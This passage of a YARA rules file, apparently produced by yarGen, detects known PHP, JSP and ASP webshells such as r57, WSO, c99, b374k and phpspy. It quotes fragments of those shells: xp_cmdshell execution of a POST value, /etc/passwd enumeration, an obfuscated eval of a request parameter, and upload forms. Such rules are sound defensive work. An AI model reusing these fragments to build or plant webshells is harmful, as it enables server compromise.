      $s1 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s2 = "echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<b" ascii
      $s3 = "echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<b" ascii
      $s4 = "     $res = mssql_query(\"select * from r57_temp_table\",$db);" fullword ascii
      $s5 = "'eng_text22'=>'datapipe'," fullword ascii
      $s6 = "    @mssql_query(\"drop table r57_temp_table\",$db);" fullword ascii
      $s7 = "     @mssql_query(\"drop table r57_temp_table\",$db);" fullword ascii
      $s8 = "'eng_text25'=>'Remote port'," fullword ascii
      $s9 = "     @mssql_query(\"create table r57_temp_table ( string VARCHAR (500) NULL)\",$db);" fullword ascii
      $s10 = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>" fullword ascii
      $s11 = "echo \"<br>\".ws(2);" fullword ascii
      $s12 = "'eng_text69'=>'param1'," fullword ascii
      $s13 = "'eng_text13'=>'IP'," fullword ascii
      $s14 = "r>pwd :'.ws(1).'</b></font><br>';" fullword ascii
      $s15 = "'eng_text67'=>'Chown/Chgrp/Chmod'," fullword ascii
      $s16 = "'eng_text70'=>'param2'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_r57_iFX_263 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = " echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verda" ascii
      $s2 = " echo '<table width=100%>', '<tr><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></di" ascii
      $s3 = " bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';" fullword ascii
      $s4 = "$table_up1  = \"<tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: \";" fullword ascii
      $s5 = "$table_up3  = \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333>\";" fullword ascii
      $s6 = " echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verda" ascii
      $s7 = " echo '<table width=100%>', '<tr><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></di" ascii
      $s8 = "v></font></td><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_wso_4_1_3_wso_4_2_2_264 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, wso-4.1.3.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash5 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "<td><form onsubmit=\\\"\".( function_exists('actionConsole')? \"g('Console',null,this.c.value);\":'' ).\"return false;\\\"><span" ascii
      $s2 = "{margin:0;color:#fff;background-color:#1e252e;border:1px solid #060a10; font:9pt Courier New;outline:none;}" fullword ascii
      $s3 = "{color:#C3C3C3;background-color:#060a10;}" fullword ascii
      $s4 = "{background-color:#1e252e;}" fullword ascii
      $s5 = "{border:1px solid #1e252e;padding:5px;margin:0;overflow:auto;}" fullword ascii
      $s6 = "echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#1e252e><span style=\"font-weight: normal;\"><pre>'.$h[0]." ascii
      $s7 = "echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#1e252e><span style=\"font-weight: normal;\"><pre>'.$h[0]." ascii
      $s8 = "body {background-color:#060a10;color:#e1e1e1;}" fullword ascii
      $s9 = "/pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#1e252e><pre>'.htmlspecialchars($h[2]).'</pre></td></t" ascii
      $s10 = "input[type='submit']:hover{background-color:#0663D5;}" fullword ascii
      $s11 = "<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='>>'></fo" ascii
      $s12 = "<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='>>'></fo" ascii
      $s13 = "rm><br  ></td>" fullword ascii
      $s14 = ":</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>" fullword ascii
      $s15 = "<td><form onsubmit=\\\"\".( function_exists('actionFilesMan')? \"g(null,this.c.value,'');\":'' ).\"return false;\\\"><span>Chang" ascii
      $s16 = "span><br><input class='toolsInp' type=text name=c value='\" . htmlspecialchars($GLOBALS['cwd']) .\"'><input type=submit value='>" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso2_WSO_4_0_5_265 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso2.php, WSO_4_0_5.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash4 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
   strings:
      $s1 = "                echo '<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.par" ascii
      $s2 = "                echo '<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.par" ascii
      $s3 = "if(empty($_POST['p2']) || @strpos(file_get_contents($item), $_POST['p2'])!==false)" fullword ascii
      $s4 = "                if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {" fullword ascii
      $s5 = "                            $temp .= join(':',$uid).\"\\n\";" fullword ascii
      $s6 = "                    $temp = \"\";" fullword ascii
      $s7 = "alue,this.param2.value);return false;\\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td>" ascii
      $s8 = "if($path!=$item)" fullword ascii
      $s9 = "echo \"<a href='#' onclick='g(\\\"FilesTools\\\",null,\\\"\".urlencode($item).\"\\\", \\\"view\\\",\\\"\\\")'>\".htmlspecialchar" ascii
      $s10 = "                        $uid = @posix_getpwuid($_POST['p2']);" fullword ascii
      $s11 = "                    for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {" fullword ascii
      $s12 = "if(@is_dir($item)){" fullword ascii
      $s13 = "input type=text name=param2 value=1000></td></tr></table><input type=submit value=\">>\"></form>';" fullword ascii
      $s14 = "foreach($paths as $item) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_c99_w4cking_Shell__ci___Biz_was_here_NIX_REMOTE_WEB_SHELL_c99_266 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, NIX REMOTE WEB-SHELL.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash5 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash6 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
      hash7 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "   echo \"<b>*nix /etc/passwd:</b><br>\";" fullword ascii
      $s2 = "   $head = explode(\" \",$stack[0]);" fullword ascii
      $s3 = "    $uid = posix_getpwuid($i);" fullword ascii
      $s4 = "   for($i=0;$i<count($head);$i++)" fullword ascii
      $s5 = "   if ($nixpasswd == 1) {$nixpasswd = 0;}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _wooyun2015052301_w02_267 {
   meta:
      description = "webshell - from files wooyun2015052301.aspx, w02.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f3d2eb157452e8cdbe6d9ca1f5ba41f022512a06f44789b3c3d263c860b6cd90"
      hash2 = "edf86c8b587dfbaa3de9635db2ba83c5bc4092db8bd4793bdc0e6f1c59a79a3a"
   strings:
      $s1 = "<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/\"e\"+\"v\"+/*-/*-*/\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u" ascii
      $s2 = "egwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegakl" ascii
      $s3 = "ehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgre" ascii
      $s4 = "rghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre" ascii
      $s5 = "ewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewge" ascii
      $s6 = "wjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwe" ascii
      $s7 = "gaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrg" ascii
      $s8 = "mgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnew" ascii
      $s9 = "gadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaer" ascii
      $s10 = "hnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghr" ascii
      $s11 = "gaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrr" ascii
      $s12 = "gejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgj" ascii
      $s13 = "ewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgw" ascii
      $s14 = "tgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgr" ascii
      $s15 = "gjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejg" ascii
      $s16 = "enregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenregadf" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them )
      ) or ( all of them )
}

rule _404_Jsp_suiyue_268 {
   meta:
      description = "webshell - from files 404.jsp, Jsp.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
      hash3 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $s1 = "  sbDown.append(\"" fullword ascii
      $s2 = "  if(confirm(\"" fullword ascii
      $s3 = " <input type=\"submit\" name=\"btnNewDir\" value=\"" fullword ascii
      $s4 = " out.println(\"<font color=red>" fullword ascii
      $s5 = " sbCopy.append(\"" fullword ascii
      $s6 = "  sbNewFile.append(\"<p><font color=red>" fullword ascii
      $s7 = " <input type=\"submit\" name=\"submit\" value=\"" fullword ascii
      $s8 = "  sbSaveCopy.append(\"<p><font color=red>" fullword ascii
      $s9 = " <input type=\"submit\" name=\"btnNewFile\" value=\"" fullword ascii
      $s10 = " sbNewFile.append(\"<p><font color=red>" fullword ascii
      $s11 = " //bug 5.09M " fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule _icesword_job_ma4_ha_2_520_dy_ma1_269 {
   meta:
      description = "webshell - from files icesword.jsp, job.jsp, ma4.jsp, ha.jsp, 2.jsp, 520.jsp, dy.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
      hash2 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash3 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
      hash4 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash5 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
      hash6 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash7 = "c525fc8c5db44286a6f04746faa3c9e2f5087cda1962c5154b758515f3e1bb1b"
      hash8 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "\\\"\" + pathConvert(folder.getPath()) + \"\\\"" fullword ascii
      $s2 = "javascript:exeSql()\\\" value=\\\"" fullword ascii
      $s3 = "<br/><textarea name=\\\"sql\\\" cols=\\\"70\\\" rows=\\\"6\\\">\" + sql + \"</textarea><br/><input type=\\\"submit\\\" class=" ascii
      $s4 = "\\\"\" + files2Delete[i] + \"\\\"" fullword ascii
      $s5 = "\\\"\" + folderName + \"\\\"" fullword ascii
      $s6 = "\\\"\" + path + fileName + \"\\\"" fullword ascii
      $s7 = "\\\"\" + file2Rename + \"\\\"" fullword ascii
      $s8 = "\\\"\" + files2Copy[i] + \"\\\"" fullword ascii
      $s9 = "\\\"\" + path + \"\\\"" fullword ascii
      $s10 = "\" + path + \"" fullword ascii
      $s11 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\", \"java\", \"js\", \"css\", \"c\", \"cpp\", \"sh" ascii
      $s12 = "\\\"/>&nbsp;<input type=\\\"reset\\\" class=\\\"button\\\" onclick=\\\"javascript:resetIt()\\\" value=\\\"" fullword ascii
      $s13 = "<br/><textarea name=\\\"sql\\\" cols=\\\"70\\\" rows=\\\"6\\\">\" + sql + \"</textarea><br/><input type=\\\"submit\\\" class=" ascii
      $s14 = "\\\" />&nbsp;<input type=\\\"button\\\" class=\\\"button\\\" value=\\\"" fullword ascii
      $s15 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input type=\\\"submit\\\" value=\\\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _icesword_job_ha_520_ma1_270 {
   meta:
      description = "webshell - from files icesword.jsp, job.jsp, ha.jsp, 520.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
      hash2 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash3 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash4 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash5 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword ascii
      $s2 = "            <input type=\"hidden\" name=\"__EVENTTARGET\" value=\"\" />" fullword ascii
      $s3 = "                <input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"butto" ascii
      $s4 = "            <script language=\"javascript\" type=\"text/javascript\">" fullword ascii
      $s5 = "<div align=\"center\" style=\"position:absolute;width:100%;visibility:show; z-index:0;left:14px;top:200px\">" fullword ascii
      $s6 = "            <form name=\"f1\" method=\"post\">" fullword ascii
      $s7 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
      $s8 = "                <input name=\"password\" type=\"password\" class=\"textbox\" id=\"Textbox\" />" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__2014_UnKnown_Vip__1__UnKnown_Vip_NEW_WebShell__1___2014_10_23_14_54_16___271 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, 2014.asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, .asp, NEW WebShell.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash3 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash4 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash5 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash6 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash7 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash8 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash9 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash10 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash11 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $x1 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
      $s2 = "stream.Write rs(\"fileContent\")" fullword ascii
      $s3 = "If InStr(Mid(thePath, i + 1), \"\\\") Then" fullword ascii
      $s4 = "stream.SetEos()" fullword ascii
      $s5 = "stream.Open" fullword ascii
      $s6 = "stream.LoadFromFile(item.Path)" fullword ascii
      $s7 = "Dim rs, conn, stream, connStr, adoCatalog" fullword ascii
      $s8 = "rs.Open \"FileData\", conn, 1, 1" fullword ascii
      $s9 = "saTreeForMdb thePath, rs, stream" fullword ascii
      $s10 = "saTreeForMdb item.Path, rs, stream" fullword ascii
      $s11 = "rs.Open \"FileData\", conn, 3, 3" fullword ascii
      $s12 = "Dim rs, ws, str, conn, stream, connStr, theFolder" fullword ascii
      $s13 = "Sub unPack(thePath)" fullword ascii
      $s14 = "fsoTreeForMdb thePath, rs, stream" fullword ascii
      $s15 = "Do While i > 0" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_4_b374k_2_5_source_b374k_2_6_source_b374k_3_2_2_b374k_3_2_3_b374k_2_7_source_272 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-3.2.2.php, b374k-3.2.3.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash3 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash4 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash5 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash6 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash7 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|cl" ascii
      $s2 = "if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|cl" ascii
      $s3 = "ient|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){" fullword ascii
      $s4 = "elseif(!isset($_SERVER['HTTP_USER_AGENT'])){" fullword ascii
      $s5 = "@ini_set('log_errors','0');" fullword ascii
      $s6 = "<meta name='robots' content='noindex, nofollow, noarchive'>" fullword ascii
      $s7 = "@ini_set('display_errors','0');" fullword ascii
      $s8 = "@ini_set('html_errors','0');" fullword ascii
      $s9 = "\"/etc/lighttpd/lighttpd.conf\", \"/etc/nginx/nginx.conf\"," fullword ascii
      $s10 = "if(e.keyCode==9){" fullword ascii
      $s11 = "else return \"???????????\";" fullword ascii
      $s12 = "\"/etc/fstab\", \"/etc/mtab\", \"/etc/crontab\", \"/etc/inittab\", \"/etc/modules.conf\", \"/etc/modules\");" fullword ascii
      $s13 = "@clearstatcache();" fullword ascii /* Goodware String - occured 2 times */
      $s14 = "\"/etc/named.conf\", \"/etc/network/interfaces\", \"/etc/squid/squid.conf\", \"/usr/local/squid/etc/squid.conf\"," fullword ascii
      $s15 = "<div id='menu'>" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_PHPSPY_phpspy_2006_phpspy_2005_lite_273 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, PHPSPY.php, phpspy_2006.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
      hash3 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash4 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword ascii
      $s2 = "| Email: 4ngel@21cn.com                                                    |" fullword ascii
      $s3 = "|        http://www.bugkidz.org                                            |" fullword ascii
      $s4 = "| http://www.4ngel.net                                                     |" fullword ascii
      $s5 = "| Team:  http://www.4ngel.net                                              |" fullword ascii
      $s6 = "</a> | <a href=\"?action=dir\">" fullword ascii
      $s7 = "color: \"#465584\";" fullword ascii
      $s8 = "body,td {" fullword ascii
      $s9 = "line-height: \"150%\";" fullword ascii
      $s10 = "color: \"#000000\";" fullword ascii
      $s11 = "</a> | <a href=\"?action=phpenv\">PHP" fullword ascii
      $s12 = "| Codz by Angel                                                            |" fullword ascii
      $s13 = "| ======================================================================== |" fullword ascii
      $s14 = "+--------------------------------------------------------------------------+" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_wso_4_2_5_wso_4_1_3_wso_4_2_2_274 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, wso-4.2.5.php, wso-4.1.3.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash5 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash6 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s2 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s3 = "<input type='submit' value='hashcrack.com' onclick=\\\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submi" ascii
      $s4 = "<input type='submit' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
      $s5 = "<input type='submit' value='hashcrack.com' onclick=\\\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submi" ascii
      $s6 = "TP_HOST'] . \" - WSO \" . VERSION .\"</title>" fullword ascii
      $s7 = "<input type='submit' value='md5decrypter.com' onclick=\\\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()" ascii
      $s8 = "<input type='submit' value='md5decrypter.com' onclick=\\\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()" ascii
      $s9 = "<input type='submit' value='hashcracking.ru' onclick=\\\"document.hf.action='https://hashcracking.ru/index.php';document.hf.subm" ascii
      $s10 = "<input type='submit' value='hashcracking.ru' onclick=\\\"document.hf.action='https://hashcracking.ru/index.php';document.hf.subm" ascii
      $s11 = "$is_writable = is_writable($GLOBALS['cwd'])?\" <font color='#FFDB5F'>[ Writeable ]</font>\":\" <font color=red>(Not writable)</f" ascii
      $s12 = "$is_writable = is_writable($GLOBALS['cwd'])?\" <font color='#FFDB5F'>[ Writeable ]</font>\":\" <font color=red>(Not writable)</f" ascii
      $s13 = "r></table>';" fullword ascii
      $s14 = "{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}" fullword ascii
      $s15 = "return '<font color=#FFDB5F><b>'.perms(@fileperms($f)).'</b></font>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

